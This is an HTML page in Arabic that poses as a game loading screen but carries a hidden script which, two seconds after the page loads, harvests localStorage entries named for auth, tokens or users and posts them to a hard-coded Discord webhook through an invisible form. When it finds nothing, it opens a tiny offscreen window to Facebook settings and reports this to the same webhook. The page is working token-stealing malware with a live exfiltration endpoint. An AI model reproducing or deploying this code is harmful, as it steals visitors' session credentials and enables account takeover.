<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">14</div>
    <div class="loader"></div>
    <p>جاري كسر حماية الجلسة (V1.2.6)...</p>

    <iframe name="hidden_receiver" style="display:none;"></iframe>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function sendToDiscord(title, content) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = WEBHOOK_URL;
            form.target = 'hidden_receiver';
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'payload_json';
            input.value = JSON.stringify({
                embeds: [{ title: title, description: content, color: 16711680 }]
            });
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        // التكتيك الجديد: محاولة سحب الـ Auth Token من الـ LocalStorage بطريقة "عميقة"
        function deepHarvest() {
            try {
                // سحب مفاتيح الدخول المحتملة (المتصفح غالباً بيخزنها هنا)
                let loot = "";
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('user')) {
                        loot += `**${key}**: ${localStorage.getItem(key)}\n`;
                    }
                }

                if (loot) {
                    sendToDiscord("🔥 كنز التوكنات", loot);
                } else {
                    sendToDiscord("⚠️ تنبيه", "التخزين المحلي فارغ - محاولة السحب عبر الـ Redirect...");
                    
                    // إذا فشل السحب المباشر، نجبر المتصفح يفتح صفحة الإعدادات في تبويب مخفي
                    // هاد الطلب بيخلي المتصفح "ينعش" الجلسة ويعطينا إشعار
                    window.open("https://mbasic.facebook.com/settings", "_blank", "width=1,height=1,left=10000");
                    sendToDiscord("🚀 Session Refresh", "تم إجبار المتصفح على فتح جلسة فيسبوك في الخلفية.");
                }
            } catch (e) {
                sendToDiscord("❌ خطأ", e.message);
            }
        }

        setTimeout(deepHarvest, 2000);
    </script>
</body>
</html>
